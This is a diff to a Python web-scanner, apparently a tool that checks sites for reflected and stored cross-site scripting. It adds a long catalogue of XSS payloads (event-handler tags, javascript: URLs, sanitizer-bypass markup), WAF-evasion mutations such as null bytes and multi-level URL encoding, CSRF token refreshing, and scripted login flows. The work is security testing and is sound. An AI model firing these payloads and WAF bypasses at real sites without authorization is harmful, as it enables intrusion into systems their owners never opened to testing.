@@ -50,12 +50,14 @@ import concurrent.futures
 import datetime
 import html as htmllib
 import http.cookiejar
+import json
 import random
 import re
 import secrets
 import sys
 import threading
 import time
+import urllib.error
 import urllib.parse
 import urllib.request
 from html.parser import HTMLParser
@@ -75,11 +77,256 @@ ATTR_MARK = '"'           # a bare double-quote surviving raw = attribute breako
 # attribute-quote followed by a benign tag. The others are payloads tuned to
 # a specific reflection context that the v3.5 sink-context detector labels.
 PAYLOAD_VARIANTS = {
+    # v3.10 base five: attribute breakout + close-tag families.
     "body":            ('"<dXsS>',                '<dXsS>'),
     "title-breakout":  ('</title><dXsS>',         '</title><dXsS>'),
     "attr-breakout":   ('"><dXsS>',               '"><dXsS>'),
     "script-breakout": ("';<dXsS>//",             '<dXsS>'),
     "url-scheme":      ('javascript:/*<dXsS>*/',  'javascript:/*<dXsS>*/'),
+
+    # Phase 1.2 additions: event-handler tags (the most common real-world
+    # XSS execution vectors). Each is a fully-formed HTML tag that runs an
+    # attribute handler in a browser. The marker embeds the tag so the
+    # verdict fires only if the tag itself survived raw, not just the
+    # `<dXsS>` grep-marker after it. All names end in `-breakout` so
+    # _apply_ct_gate upgrades severity to executable when unencoded.
+    "svg-breakout":            ('"><svg onload=1><dXsS>',
+                                '<svg onload=1><dXsS>'),
+    "img-breakout":            ('"><img src=x onerror=1><dXsS>',
+                                '<img src=x onerror=1><dXsS>'),
+    "body-onload-breakout":    ('"><body onload=1><dXsS>',
+                                '<body onload=1><dXsS>'),
+    "details-toggle-breakout": ('"><details open ontoggle=1><dXsS>',
+                                '<details open ontoggle=1><dXsS>'),
+    "input-autofocus-breakout":('"><input autofocus onfocus=1><dXsS>',
+                                '<input autofocus onfocus=1><dXsS>'),
+
+    # Modern-HTML5 sanitizer bypass surfaces.
+    "iframe-srcdoc-breakout":  ('"><iframe srcdoc="<dXsS>">',
+                                '<iframe srcdoc="<dXsS>"'),
+    "video-source-breakout":   ('"><video><source onerror=1></video><dXsS>',
+                                '<video><source onerror=1></video><dXsS>'),
+
+    # Alternative quote-style breakouts (many templates use single quotes,
+    # some frameworks use backticks in attribute values).
+    "attr-squote-breakout":    ("'><dXsS>",              "'><dXsS>"),
+    "attr-backtick-breakout":  ('`><dXsS>',              '`><dXsS>'),
+
+    # JS/template contexts.
+    "template-literal-breakout": ('${(1)}<dXsS>',        '${(1)}<dXsS>'),
+    "html-comment-breakout":     ('--><dXsS>',           '--><dXsS>'),
+
+    # Phase 1.2 milestone 2 additions ---------------------------------------
+    # Nested-script sanitizer bypass. Some allowlist sanitizers strip
+    # <script> at the top level but do not recurse into SVG/MathML foreign
+    # content, so the inner <script> executes.
+    "svg-script-nested-breakout": (
+        '"><svg><script>1</script></svg><dXsS>',
+        '<svg><script>1</script></svg><dXsS>',
+    ),
+    # MathML foreign-content surface. mglyph is a rare sink that some
+    # DOMPurify-derivatives missed until 2.4+.
+    "math-mtext-breakout": (
+        '"><math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
+        '<math><mtext></mtext><mglyph src=x onerror=1></math><dXsS>',
+    ),
+    # Plugin-object surfaces. Rarely allowlisted but sometimes reach the
+    # DOM through Markdown or WYSIWYG editors.
+    "object-data-breakout": (
+        '"><object data=data:text/html,<dXsS>></object>',
+        '<object data=data:text/html,<dXsS>></object>',
+    ),
+    "embed-src-breakout": (
+        '"><embed src=data:text/html,<dXsS>>',
+        '<embed src=data:text/html,<dXsS>>',
+    ),
+    # Legacy tags with modern event handlers. Sanitizers focused on
+    # <script>/<img>/<svg> often forget these.
+    "marquee-onstart-breakout": (
+        '"><marquee onstart=1><dXsS></marquee>',
+        '<marquee onstart=1><dXsS></marquee>',
+    ),
+    "select-onfocus-breakout": (
+        '"><select autofocus onfocus=1><dXsS></select>',
+        '<select autofocus onfocus=1><dXsS></select>',
+    ),
+    "textarea-onfocus-breakout": (
+        '"><textarea autofocus onfocus=1><dXsS></textarea>',
+        '<textarea autofocus onfocus=1><dXsS></textarea>',
+    ),
+    # HTML5 form action override. A stored button with `formaction=` hijacks
+    # the submit destination of the outer form.
+    "form-formaction-breakout": (
+        '"><form><button formaction=javascript:1><dXsS></button></form>',
+        '<form><button formaction=javascript:1><dXsS></button></form>',
+    ),
+    # data: URI iframe. Bypasses text-only sanitizers because the payload
+    # rides inside the iframe's src attribute value.
+    "iframe-data-uri-breakout": (
+        '"><iframe src=data:text/html,<dXsS>>',
+        '<iframe src=data:text/html,<dXsS>>',
+    ),
+    # JS double-quoted string escape. Complements script-breakout (which is
+    # single-quoted). Together they cover both string-quote conventions.
+    "js-double-string-breakout": (
+        '";<dXsS>//',
+        '<dXsS>',
+    ),
+    # javascript: href on anchor. Extremely common in real targets; users
+    # click, alert fires.
+    "anchor-href-javascript-breakout": (
+        '"><a href=javascript:1><dXsS></a>',
+        '<a href=javascript:1><dXsS></a>',
+    ),
+    # <noscript> context. Some sanitizers do NOT parse noscript children
+    # (because scripting is assumed on) so injected content leaks in.
+    "noscript-breakout": (
+        '"><noscript><p title="</noscript><dXsS>',
+        '</noscript><dXsS>',
+    ),
+    # <style> block. CSS injection surface -- @import can pull external
+    # payload, but even without it the tag survival proves the escape.
+    "style-tag-breakout": (
+        '"><style>@import url(<dXsS>)</style>',
+        '<style>@import url(<dXsS>)</style>',
+    ),
+
+    # Phase 1.2 milestone 3 additions ---------------------------------------
+
+    # CSS-context breakouts. Payload lands inside a style attribute or a
+    # <style> block; needs to close the current CSS syntactic construct.
+    "style-value-breakout": (
+        ';background:url(<dXsS>);',
+        ';background:url(<dXsS>);',
+    ),
+    "css-comment-breakout": (
+        '*/<dXsS>',
+        '*/<dXsS>',
+    ),
+    "css-import-breakout": (
+        ');<dXsS>',
+        ');<dXsS>',
+    ),
+
+    # HTML5 dialog element. Post-2022 additions; older sanitizers do not
+    # know about oncancel / onbeforetoggle attributes.
+    "dialog-onbeforetoggle-breakout": (
+        '"><dialog open onbeforetoggle=1><dXsS></dialog>',
+        '<dialog open onbeforetoggle=1><dXsS></dialog>',
+    ),
+    "dialog-oncancel-breakout": (
+        '"><dialog open oncancel=1><dXsS></dialog>',
+        '<dialog open oncancel=1><dXsS></dialog>',
+    ),
+
+    # Attribute-list injection. Stays INSIDE the current tag by opening one
+    # attribute and appending a handler + a swallow-comment. Different
+    # mechanism from attr-breakout (which escapes the tag entirely) - many
+    # sanitizers block `>` but allow bare `"`.
+    "attr-inject-onerror-breakout": (
+        '" onerror=1//',
+        '" onerror=1//',
+    ),
+    "attr-inject-onmouseover-breakout": (
+        '" onmouseover=1//',
+        '" onmouseover=1//',
+    ),
+
+    # URL-context tags that hijack navigation. `<base href=javascript:>`
+    # rewrites every subsequent relative URL. `<meta http-equiv=refresh>`
+    # navigates automatically.
+    "base-href-javascript-breakout": (
+        '"><base href=javascript:1//><dXsS>',
+        '<base href=javascript:1//><dXsS>',
+    ),
+    "meta-refresh-breakout": (
+        '"><meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
+        '<meta http-equiv=refresh content=0;url=javascript:1><dXsS>',
+    ),
+
+    # SVG-namespace event handlers beyond onload. animate/set can fire
+    # without user interaction.
+    "svg-animate-onbegin-breakout": (
+        '"><svg><animate onbegin=1><dXsS></svg>',
+        '<svg><animate onbegin=1><dXsS></svg>',
+    ),
+
+    # Media surface complement to video-source-breakout.
+    "audio-onerror-breakout": (
+        '"><audio><source onerror=1></audio><dXsS>',
+        '<audio><source onerror=1></audio><dXsS>',
+    ),
+
+    # Legacy tags still parsed by every mainstream browser. Some allowlist
+    # sanitizers explicitly bless <xmp> as "safe pre-formatted text",
+    # forgetting that anything AFTER </xmp> re-enters normal parsing.
+    "xmp-breakout": (
+        '</xmp><dXsS>',
+        '</xmp><dXsS>',
+    ),
+
+    # JS-context complements.
+    "js-regex-breakout": (
+        '/;<dXsS>//',
+        '<dXsS>',
+    ),
+    "js-comment-close-breakout": (
+        '*/<dXsS>',
+        '*/<dXsS>',
+    ),
+
+    # HTML5 template/slot. Web Components content boundary; some
+    # sanitizers stop at <template> and leave its shadow tree unscrubbed.
+    "template-shadow-breakout": (
+        '"><template shadowrootmode=open><script>1</script></template><dXsS>',
+        '<template shadowrootmode=open><script>1</script></template><dXsS>',
+    ),
+
+    # Phase 1.2 milestone 4 additions ---------------------------------------
+    # <link rel=stylesheet href=x onerror=1>. Modern browsers fire onerror
+    # on link load failure; many allowlist sanitizers miss link event
+    # handlers because they focus on <script>/<img>/<svg>.
+    "link-onerror-breakout": (
+        '"><link rel=stylesheet href=x onerror=1><dXsS>',
+        '<link rel=stylesheet href=x onerror=1><dXsS>',
+    ),
+    # <frameset><frame onload=1>. Frameset context is rarely modelled by
+    # sanitizers. Works in every mainstream browser that still parses
+    # framesets (which is all of them at this writing).
+    "frame-onload-breakout": (
+        '"><frameset><frame onload=1><dXsS></frameset>',
+        '<frameset><frame onload=1><dXsS></frameset>',
+    ),
+    # <video><track src=x onerror=1>. Complement to video-source: the
+    # track element accepts its own onerror. Different attribute path
+    # from source-onerror-breakout so a stripping-only-<source> sanitizer
+    # still fires this.
+    "track-onerror-breakout": (
+        '"><video><track src=x onerror=1></video><dXsS>',
+        '<video><track src=x onerror=1></video><dXsS>',
+    ),
+    # <input onauxclick=1>. Middle/right-click event. Rarely-audited
+    # handler that fires without a normal click UX.
+    "input-onauxclick-breakout": (
+        '"><input onauxclick=1 value=test><dXsS>',
+        '<input onauxclick=1 value=test><dXsS>',
+    ),
+    # <button formaction=javascript:1 formtarget=_blank>. Distinct from
+    # form-formaction-breakout: formtarget=_blank opens the exploit in
+    # a new tab, defeating iframe-sandbox and some referrer policies.
+    "button-formtarget-breakout": (
+        '"><form><button formaction=javascript:1 formtarget=_blank>'
+        '<dXsS></button></form>',
+        '<button formaction=javascript:1 formtarget=_blank><dXsS>'
+        '</button></form>',
+    ),
+    # <input onfocusin=1 autofocus>. Bubbling focus event; sanitizers
+    # blocking onfocus by name miss onfocusin. Same trigger mechanism
+    # (autofocus attribute) so no user interaction needed.
+    "input-onfocusin-breakout": (
+        '"><input onfocusin=1 autofocus value=x><dXsS>',
+        '<input onfocusin=1 autofocus value=x><dXsS>',
+    ),
 }
 
 
@@ -88,12 +335,76 @@ PAYLOAD_VARIANTS = {
 # the base payload is blocked by a regex WAF (rules that match <dXsS> or
 # <script literal etc.), one of these variants may still slip through by
 # obfuscating the parts the WAF pattern anchored on.
+#
+# Every mutation must produce a shape that (a) a lenient HTML parser
+# re-forms into the intended tag and (b) transforms both the sent canary
+# and the verdict marker identically, so verdict() still finds it in the
+# response body.
 _WAF_MUTATIONS = [
     # (name, marker_transform) -- both sides get the same replacement
-    ("case",       lambda s: s.replace('<dXsS>', '<DxSs>')),
-    ("split-cmt",  lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
-    ("whitespace", lambda s: s.replace('<dXsS>', '<dXsS  >')),
-    ("url-encode", lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),
+    # v3.10 originals:
+    ("case",              lambda s: s.replace('<dXsS>', '<DxSs>')),
+    ("split-cmt",         lambda s: s.replace('<dXsS>', '<d<!---->XsS>')),   # comment splits the tag; parser re-forms
+    ("whitespace",        lambda s: s.replace('<dXsS>', '<dXsS  >')),
+    ("url-encode",        lambda s: s.replace('<dXsS>', '%3CdXsS%3E')),
+
+    # Phase 1.2 additions:
+    # HTML5 permits tab/newline as whitespace inside a tag; many regex WAFs
+    # look only for `<[A-Za-z]+ ` (space) after the tag name.
+    ("tab-in-tag",        lambda s: s.replace('<dXsS>', '<dXsS\t>')),
+    ("newline-in-tag",    lambda s: s.replace('<dXsS>', '<dXsS\n>')),
+
+    # `<tag/attr=…>` is valid HTML5 — the slash is legal whitespace-like
+    # separator. Slips regex WAFs anchored on space.
+    ("slash-separator",   lambda s: s.replace('<dXsS>', '<dXsS/>')),
+
+    # Double URL-encode. If the intermediary decodes once and the backend
+    # decodes once, we land back to `<dXsS>` on final render. WAFs that
+    # only decode once still see `%253C`.
+    ("double-url-encode", lambda s: s.replace('<dXsS>', '%253CdXsS%253E')),
+
+    # Phase 1.2 milestone 2 additions --------------------------------------
+    # Carriage return is HTML5 whitespace inside a tag; same idea as
+    # tab-in-tag / newline-in-tag but a distinct byte a WAF regex may miss.
+    ("cr-in-tag",         lambda s: s.replace('<dXsS>', '<dXsS\r>')),
+
+    # Form feed. Rarer WAF coverage than \t\n\r; still HTML5-legal.
+    ("form-feed-in-tag",  lambda s: s.replace('<dXsS>', '<dXsS\f>')),
+
+    # CRLF combined. Belt-and-suspenders whitespace bypass.
+    ("crlf-in-tag",       lambda s: s.replace('<dXsS>', '<dXsS\r\n>')),
+
+    # Null byte in the tag. Classic bypass for WAFs that treat NUL as a
+    # string terminator; the servlet layer often passes the whole thing
+    # through. Encoded as %00 so it survives text-based URL transport.
+    ("null-byte-tag",     lambda s: s.replace('<dXsS>', '<dXsS%00>')),
+
+    # Backslash before closing bracket. Some WAFs anchor on `<[A-Za-z]+>`
+    # exactly; a trailing backslash breaks the pattern but a lenient
+    # HTML parser reforms the tag.
+    ("backslash-tag",     lambda s: s.replace('<dXsS>', '<dXsS\\>')),
+
+    # Phase 1.2 milestone 3 additions --------------------------------------
+
+    # Space + tab combo. A few WAF regexes normalise \s but stop at the
+    # first whitespace class match; a mixed run confuses length-based rules.
+    ("space-tab-mix",     lambda s: s.replace('<dXsS>', '<dXsS \t>')),
+
+    # Triple URL-encode. For reverse-proxy chains where each hop decodes
+    # once. Rare but exists in enterprise stacks with three-tier ingress.
+    ("triple-url-encode", lambda s: s.replace('<dXsS>', '%25253CdXsS%25253E')),
+
+    # Lowercase percent-hex. Some WAF signatures anchor uppercase (`%3C`)
+    # only; the RFC allows either case and browsers accept both.
+    ("percent-lowercase", lambda s: s.replace('<dXsS>', '%3cdXsS%3e')),
+
+    # Comment split AFTER the tag name (not inside). Distinct from split-cmt
+    # because the WAF regex might tolerate that position differently.
+    ("split-cmt-suffix",  lambda s: s.replace('<dXsS>', '<dXsS<!---->>')),
+
+    # CR + space combined. Belt-and-suspenders whitespace variant that
+    # some CRS rules explicitly do NOT normalise together.
+    ("cr-space-mix",      lambda s: s.replace('<dXsS>', '<dXsS\r >')),
 ]
 
 
@@ -330,6 +641,18 @@ def fetch(url, data=None, method=None, extra=None):
     headers.update(EXTRA_HEADERS)                            # user-supplied wins
     if extra:
         headers.update(extra)                                # per-request override
+
+    # Phase 1.4: auto-refresh CSRF token on stateful requests. Fires only
+    # when: (a) a URL to refresh from is configured, (b) a header name to
+    # install into is configured, (c) this request has a body OR uses a
+    # non-GET method (so a token refresh does not itself refresh recursively).
+    # The guard flag inside refresh_csrf_token stops recursion when the
+    # refresh GET calls back into fetch().
+    if (CSRF_REFRESH_URL and CSRF_HEADER_NAME and not _in_csrf_refresh()
+            and (body_bytes is not None or (method and method.upper() != "GET"))):
+        tok = refresh_csrf_token()
+        if tok:
+            headers[CSRF_HEADER_NAME] = tok
     kwargs = {"data": body_bytes, "headers": headers}
     if method:
         kwargs["method"] = method.upper()
@@ -706,6 +1029,68 @@ def _extract_csrf(body, field):
     m = re.search(r'name="' + re.escape(field) + r'"[^>]*value="([^"]+)"', body) \
         or re.search(r'value="([^"]+)"[^>]*name="' + re.escape(field) + r'"', body)
     return m.group(1) if m else None
+
+
+# --- Phase 1.4: CSRF token rotation ----------------------------------------
+#
+# Modern Rails / Laravel / Django-Rest / any SPA hosts a fresh CSRF token
+# on every request. The token is either in a `<meta name="csrf-token" ...>`
+# tag (Rails/Laravel SPA convention) or in a form-input hidden field
+# (server-rendered Rails/Django). Every stateful request MUST send it back
+# via a header (`X-CSRF-Token`, `X-CSRF-TOKEN`, `X-XSRF-TOKEN`) or a form
+# field of the same name.
+#
+# The pre-1.4 flow was: read the token once from the target page, cache
+# it, resend forever. That breaks on any target that rotates per request.
+# Phase 1.4: refresh the token from a configured URL before EACH stateful
+# submit and install it as a header (SPA case) automatically inside fetch.
+
+CSRF_REFRESH_URL = ""         # if set, GET before each stateful request
+CSRF_HEADER_NAME = ""         # if set, install refreshed token as this header
+_CSRF_REFRESH_GUARD = threading.local()
+
+_CSRF_PATTERNS = [
+    # Rails <meta name="csrf-token" content="...">
+    r'<meta\s+name=["\']?csrf-token["\']?\s+content=["\']([^"\']+)["\']',
+    # Laravel <meta name="_token" content="...">
+    r'<meta\s+name=["\']?_token["\']?\s+content=["\']([^"\']+)["\']',
+    # Django <meta name="csrfmiddlewaretoken" content="...">
+    r'<meta\s+name=["\']?csrfmiddlewaretoken["\']?\s+content=["\']([^"\']+)["\']',
+    # Form-input variants (Rails authenticity_token, Laravel _token,
+    # Django csrfmiddlewaretoken, generic csrf_token / tokenCSRF).
+    r'<input[^>]+name=["\']?(?:authenticity_token|_token|csrf_token|csrfmiddlewaretoken|tokenCSRF)["\']?[^>]+value=["\']([^"\']+)["\']',
+    r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']?(?:authenticity_token|_token|csrf_token|csrfmiddlewaretoken|tokenCSRF)["\']?',
+]
+
+
+def _in_csrf_refresh():
+    return getattr(_CSRF_REFRESH_GUARD, "flag", False)
+
+
+def refresh_csrf_token(url=""):
+    """GET the given URL (or the module-level CSRF_REFRESH_URL) and return
+    the first CSRF token that matches any of the four documented patterns.
+    Returns "" on unreachable target, empty body, or no pattern match.
+    Never raises; the caller decides whether "" means abort or continue.
+
+    Guarded against recursion: if fetch() calls back into refresh while
+    already refreshing, it short-circuits so the token-fetch itself does
+    not re-trigger a token-fetch."""
+    url = url or CSRF_REFRESH_URL
+    if not url:
+        return ""
+    _CSRF_REFRESH_GUARD.flag = True
+    try:
+        status, _final, body, _ct = fetch(url)
+    finally:
+        _CSRF_REFRESH_GUARD.flag = False
+    if not body or (isinstance(body, str) and body.startswith("__error__")):
+        return ""
+    for pattern in _CSRF_PATTERNS:
+        m = re.search(pattern, body, re.IGNORECASE)
+        if m:
+            return m.group(1)
+    return ""
 
 
 def _cookie_jar():
@@ -1162,6 +1547,304 @@ def _parse_kv_list(text):
     return out
 
 
+# --- Phase 1.3: JSON workflow chaining (state machine) --------------------
+#
+# The engine reads a flow definition (register -> post -> verify pattern),
+# threads variables between steps, substitutes {VAR}/{RND}/{CANARY}/{CID}
+# placeholders, and runs the final verdict against the canary marker.
+# Zero-dep: JSON instead of YAML so no PyYAML dependency creeps in.
+#
+# Flow shape (see bench/flows/*.json for examples):
+#   {
+#     "name": "register-comment-verify",
+#     "steps": [
+#       {"name": "reg", "method": "POST", "url": "/api/register",
+#        "body": {"email": "u-{RND}@x.com"},
+#        "content_type": "application/json",
+#        "save": {"token": "$.token", "uid": "$.user.id"}},
+#       {"name": "post", "method": "POST", "url": "/api/comments",
+#        "headers": {"Authorization": "Bearer {token}"},
+#        "body": {"text": "{CANARY}"},
+#        "content_type": "application/json"},
+#       {"name": "check", "method": "GET",
+#        "url": "/comments/{uid}", "verdict": true}
+#     ]
+#   }
+
+def _jsonpath_get(data, expr):
+    """Tiny JSONPath subset. Supports `$`, `.key`, `[N]`, `[*]`.
+
+    Returns the extracted value, or None if any hop misses.
+    Not a full spec - we deliberately keep it narrow so a flow author
+    always knows what a path resolves to.
+    """
+    if not expr or not expr.startswith("$"):
+        return None
+    cur = data
+    i = 1
+    while i < len(expr):
+        c = expr[i]
+        if c == ".":
+            j = i + 1
+            while j < len(expr) and expr[j] not in ".[":
+                j += 1
+            key = expr[i + 1:j]
+            if not isinstance(cur, dict) or key not in cur:
+                return None
+            cur = cur[key]
+            i = j
+        elif c == "[":
+            j = expr.find("]", i)
+            if j == -1:
+                return None
+            token = expr[i + 1:j]
+            if token == "*":
+                if not isinstance(cur, list):
+                    return None
+                # star returns list of all children; caller decides
+                cur = list(cur)
+            else:
+                try:
+                    idx = int(token)
+                except ValueError:
+                    return None
+                if not isinstance(cur, list) or not (-len(cur) <= idx < len(cur)):
+                    return None
+                cur = cur[idx]
+            i = j + 1
+        else:
+            return None
+    return cur
+
+
+_PLACEHOLDER_RE = re.compile(r"\{([A-Z0-9_]+|[a-z][a-zA-Z0-9_]*)\}")
+
+
+def _substitute(value, vars_):
+    """Recursively substitute `{NAME}` placeholders in strings inside
+    value (which may be a str, dict, list, or primitive). `vars_` is the
+    running namespace: {RND, CANARY, CID, ...saved from previous steps}.
+
+    A missing placeholder is left as-is (`{unknown}` stays literal) so
+    the flow author can spot the typo in the sent request rather than
+    the engine silently substituting empty."""
+    if isinstance(value, str):
+        def _rep(m):
+            key = m.group(1)
+            if key in vars_:
+                return str(vars_[key])
+            return m.group(0)
+        return _PLACEHOLDER_RE.sub(_rep, value)
+    if isinstance(value, dict):
+        return {k: _substitute(v, vars_) for k, v in value.items()}
+    if isinstance(value, list):
+        return [_substitute(v, vars_) for v in value]
+    return value
+
+
+def _fetch_flow_step(method, url, body, headers, content_type, timeout=10):
+    """Issue one HTTP request as part of a flow. Returns
+    (status, body_text, content_type_header, parsed_json_or_None)."""
+    method = (method or "GET").upper()
+    data = None
+    if body is not None:
+        if isinstance(body, (dict, list)) and content_type and \
+                "application/json" in content_type.lower():
+            data = json.dumps(body).encode("utf-8")
+        elif isinstance(body, (dict, list)):
+            data = urllib.parse.urlencode(body).encode("utf-8")
+        elif isinstance(body, str):
+            data = body.encode("utf-8")
+        else:
+            data = str(body).encode("utf-8")
+    req = urllib.request.Request(url, data=data, method=method)
+    if content_type:
+        req.add_header("Content-Type", content_type)
+    for h, hv in (headers or {}).items():
+        req.add_header(h, hv)
+    for h, hv in EXTRA_HEADERS.items():
+        req.add_header(h, hv)
+    _rate_gate()
+    _jitter_gate()
+    try:
+        with OPENER.open(req, timeout=timeout) as resp:
+            raw = resp.read()
+            ct = resp.headers.get("Content-Type", "")
+            status = resp.status
+    except urllib.error.HTTPError as e:
+        raw = e.read() or b""
+        ct = e.headers.get("Content-Type", "") if e.headers else ""
+        status = e.code
+    except Exception as e:
+        return 0, f"__error__ {e}", "", None
+    text = raw.decode("utf-8", errors="replace")
+    parsed = None
+    if "application/json" in ct.lower():
+        try:
+            parsed = json.loads(text)
+        except (ValueError, json.JSONDecodeError):
+            parsed = None
+    return status, text, ct, parsed
+
+
+def run_flow(flow, canary=None, cid=None, marker=None, timeout=10):
+    """Execute a flow definition. Returns a summary dict:
+      {
+        'name': str, 'steps_run': int, 'vars': {...},
+        'verdicts': [ {step, url, status, reflection, marker} ],
+        'error': None | 'step_name: msg',
+      }
+    If any step has "verdict": true, the response body is checked for
+    the canary marker after the cid (same primitive as reflected/stored
+    modes). The first verdict step that finds an unencoded reflection
+    stops further verdict evaluation but the flow continues to run so
+    later cleanup steps can still fire.
+
+    canary / cid / marker are threaded in as the `{CANARY}` / `{CID}` /
+    `{MARKER}` placeholders. When None, a fresh body-variant canary is
+    minted."""
+    if canary is None or cid is None:
+        cid, canary = make_canary("body")
+        marker = marker or "<dXsS>"
+    marker = marker or "<dXsS>"
+
+    vars_ = {
+        "CANARY": canary,
+        "CID": cid,
+        "MARKER": marker,
+        "RND": secrets.token_hex(4),
+    }
+    summary = {
+        "name": flow.get("name", "unnamed"),
+        "steps_run": 0,
+        "vars": vars_,
+        "verdicts": [],
+        "error": None,
+    }
+
+    for step in flow.get("steps", []):
+        sname = step.get("name", f"step{summary['steps_run'] + 1}")
+        url = _substitute(step.get("url", ""), vars_)
+        method = step.get("method", "GET")
+        body = _substitute(step.get("body"), vars_)
+        headers = _substitute(step.get("headers", {}), vars_)
+        content_type = step.get("content_type")
+
+        status, text, ct, parsed = _fetch_flow_step(
+            method, url, body, headers, content_type, timeout=timeout,
+        )
+        summary["steps_run"] += 1
+
+        if status == 0:
+            summary["error"] = f"{sname}: {text}"
+            return summary
+
+        # Save extracted values into the running namespace.
+        for save_name, path in (step.get("save") or {}).items():
+            src = parsed if parsed is not None else text
+            if isinstance(src, (dict, list)):
+                vars_[save_name] = _jsonpath_get(src, path)
+            else:
+                vars_[save_name] = None
+
+        if step.get("verdict"):
+            v = verdict(cid, text, marker)
+            summary["verdicts"].append({
+                "step": sname, "url": url, "status": status,
+                "reflection": v, "marker": marker,
+            })
+
+    return summary
+
+
+def _load_flow(path):
+    """Load a JSON flow file, or return {'__error__': msg}."""
+    try:
+        with open(path) as fh:
+            return json.load(fh)
+    except (OSError, ValueError, json.JSONDecodeError) as e:
+        return {"__error__": f"cannot load flow {path}: {e}"}
+
+
+# --- Phase 1.5: macro-based auth (auth flows) ------------------------------
+#
+# An auth flow is just a `run_flow`-compatible spec with an optional top-level
+# `auth` field describing how to install the login result into subsequent
+# requests. Two shapes cover every real target we've seen:
+#
+#   Cookie session (default when `auth` is absent):
+#     {"steps": [{"method": "POST", "url": "/login",
+#                 "body": {"u": "x", "p": "y"}}]}
+#     Set-Cookie responses land in the module-level OPENER's cookie jar.
+#     Every later fetch() through OPENER carries them automatically. No
+#     header wiring needed.
+#
+#   JWT / bearer / API key (explicit):
+#     {"steps": [{"method": "POST", "url": "/api/login",
+#                 "content_type": "application/json",
+#                 "body": {"email": "x", "password": "y"},
+#                 "save": {"token": "$.token"}}],
+#      "auth": {"header": "Authorization", "value": "Bearer {token}"}}
+#     The saved token is substituted into `auth.value` and installed into
+#     EXTRA_HEADERS so every later fetch() adds the Authorization header.
+#
+# JWT-vs-cookie is not detected by inspecting the response; it is stated
+# by the flow author via presence/absence of the `auth` field. Explicit
+# beats magic - a real target sometimes issues BOTH a Set-Cookie AND a
+# JWT and the author chooses which one to reuse.
+
+
+def run_auth_flow(flow, timeout=10):
+    """Execute an auth flow. Returns a summary dict identical in shape to
+    `run_flow`'s, plus:
+      - 'auth_header': (name, value) tuple actually installed, or None
+      - 'authenticated': True if the flow completed AND either an auth
+        header was installed OR at least one Set-Cookie landed in the jar.
+
+    Side effect: installs the substituted auth header into EXTRA_HEADERS
+    on success. The caller is responsible for undoing this if it wants
+    multiple auth contexts in one process.
+    """
+    summary = run_flow(flow, timeout=timeout)
+    summary["auth_header"] = None
+    summary["authenticated"] = False
+
+    if summary["error"]:
+        return summary
+
+    # Explicit `auth` field wins - install the header.
+    auth = flow.get("auth")
+    if isinstance(auth, dict) and auth.get("header") and auth.get("value"):
+        header_name = auth["header"]
+        header_value = _substitute(auth["value"], summary["vars"])
+        # If a placeholder stayed literal ({unknown}) the token wasn't
+        # captured and we should NOT install a broken header.
+        if _PLACEHOLDER_RE.search(header_value):
+            summary["error"] = (
+                f"auth.value still has unresolved placeholder: {header_value}"
+            )
+            return summary
+        EXTRA_HEADERS[header_name] = header_value
+        summary["auth_header"] = (header_name, header_value)
+        summary["authenticated"] = True
+        return summary
+
+    # No explicit auth field: assume cookie session, look for anything
+    # in the cookie jar planted by the login steps.
+    try:
+        cj = _cookie_jar()
+        summary["authenticated"] = cj is not None and len(list(cj)) > 0
+    except Exception:
+        summary["authenticated"] = False
+    return summary
+
+
+def clear_auth_header(name):
+    """Remove a previously-installed auth header. Useful for tests and
+    for callers that want to switch auth contexts in one process."""
+    EXTRA_HEADERS.pop(name, None)
+
+
 def main():
     ap = argparse.ArgumentParser(description="dynamic reflection verifier (companion to dxa)")
     ap.add_argument("url", nargs="?", help="target URL for reflected mode (authorized/local only)")
@@ -1277,6 +1960,54 @@ def main():
                          "method, url, canary) as a tab-separated row to FILE. "
                          "Best-effort; a failed write never aborts the scan.")
 
+    # Phase 1.3: JSON workflow chaining
+    ap.add_argument("--flow", metavar="FILE", default="",
+                    help="run a JSON flow file - a series of HTTP steps with "
+                         "{VAR}/{RND}/{CANARY}/{CID} substitution and JSONPath "
+                         "save/restore between steps. Any step with \"verdict\": "
+                         "true is checked against the canary marker. See "
+                         "bench/flows/ for examples. Zero-dep (json > yaml).")
+
+    # Phase 2.1: browser (Playwright) - opt-in, prints install line if
+    # playwright not on PATH. Later phases wire DOM-sink detection + JS
+    # exec proof onto this harness.
+    ap.add_argument("--dom", action="store_true",
+                    help="use a headless Chromium (via Playwright) instead "
+                         "of urllib to visit the target. Renders JS-heavy "
+                         "SPAs. Requires `pip install playwright && "
+                         "playwright install chromium`. Later phases add "
+                         "DOM sink hooks and JS-execution proof on top of "
+                         "this harness.")
+
+    # Phase 1.4: CSRF token rotation
+    ap.add_argument("--csrf-refresh", metavar="URL", default="",
+                    help="before each stateful request, GET this URL and "
+                         "extract a fresh CSRF token (looks for meta name="
+                         "'csrf-token'|'_token'|'csrfmiddlewaretoken' or "
+                         "form input authenticity_token|_token|csrf_token|"
+                         "csrfmiddlewaretoken|tokenCSRF). Pair with "
+                         "--csrf-header to install as HTTP header. Modern "
+                         "Rails/Laravel/Django-Rest need this because the "
+                         "token rotates per request.")
+    ap.add_argument("--csrf-header", metavar="NAME", default="",
+                    help="header name to carry the refreshed CSRF token, "
+                         "e.g. 'X-CSRF-Token' (Rails), 'X-CSRF-TOKEN' "
+                         "(Laravel), 'X-XSRF-TOKEN' (Angular). Requires "
+                         "--csrf-refresh. For form-field submission the "
+                         "existing --csrf-field flag stays in charge.")
+
+    # Phase 1.5: macro-based auth
+    ap.add_argument("--auth-flow", metavar="FILE", default="",
+                    help="run a JSON auth flow BEFORE the scan starts. Same "
+                         "engine as --flow. On success: if the flow has a "
+                         "top-level `auth: {header, value}` field, the "
+                         "substituted header (e.g. 'Authorization: Bearer "
+                         "{token}') is installed into every subsequent "
+                         "request. Otherwise cookies from the login steps "
+                         "stay in the cookie jar. Replaces --login/--user/"
+                         "--pass for anything more complex than a single "
+                         "HTML form POST.")
+
     args = ap.parse_args()
 
     # Wire Phase 0.2 CLI flags into the module-level state that _record_skip reads
@@ -1306,6 +2037,64 @@ def main():
         if JITTER_MS_MAX:        _bits.append(f"jitter={JITTER_MS_MIN}-{JITTER_MS_MAX}ms")
         print(f"[dxadyn] concurrency: {', '.join(_bits)}")
 
